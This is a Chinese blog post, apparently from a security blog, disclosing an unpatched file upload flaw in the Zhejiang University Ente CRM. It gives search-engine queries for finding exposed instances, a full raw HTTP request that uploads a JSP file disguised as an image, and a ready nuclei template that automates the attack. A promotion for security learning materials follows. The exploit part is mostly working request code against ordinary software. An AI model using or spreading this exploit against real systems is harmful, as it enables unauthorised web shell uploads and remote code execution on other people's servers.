# 原创
：  浙大恩特CRM文件上传0day

# 浙大恩特CRM文件上传0day

### 简介

浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源，提升销售和市场营销的效果。

### 资产收集

fofa：title=”欢迎使用浙大恩特客户资源管理系统”<br/> hunter：web.title=”欢迎使用浙大恩特客户资源管理系统”

### 漏洞复现

漏洞地址：/entsoft/CustomerAction.entphone;.js?method=loadFile，可以上传jsp等文件，并给出上传之后的地址。<br/> 数据报如下：

```
POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=100BEE1C6DE1ED7BEF0C58564557C266; lang=zh-cn
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 10 Jun 2020 03:47:54 GMT
If-None-Match: W/"30144-1591760874831"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 199

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="as.jsp"
Content-Type: image/jpeg

&lt;%out.print("test");%&gt;
------WebKitFormBoundarye8FPHsIAq9JN8j2A--

```

<br/> 访问文件地址，可以看到jsp代码被解析了。

### nuclei验证

nuclei-poc：

```
id: zhedaenteCRM

info:
  name: zhedaenteCRM
  author: xxx
  severity: info
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      - |-
        POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: JSESSIONID=100BEE1C6DE1ED7BEF0C58564557C266; lang=zh-cn
        Upgrade-Insecure-Requests: 1
        If-Modified-Since: Wed, 10 Jun 2020 03:47:54 GMT
        If-None-Match: W/"30144-1591760874831"
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
        Content-Length: 199

        ------WebKitFormBoundarye8FPHsIAq9JN8j2A
        Content-Disposition: form-data; name="file";filename="as.jsp"
        Content-Type: image/jpeg

        &lt;%out.print("test");%&gt;
        ------WebKitFormBoundarye8FPHsIAq9JN8j2A--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'filepath":'
      - type: status
        status:
          - 200

```

验证

 

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/3bc3f486f3af4c7a857166d3cf685894.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/83849a931b5548c19257eaca3a18ff20.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/55210a9a744b4897944fcac87c001db7.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/10d873d1f68a46f5a5334faccde7311c.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/3ea834d8709c4aabbf6cd422b2635a6a.png" width="665"/>

应急响应笔记

学习路线
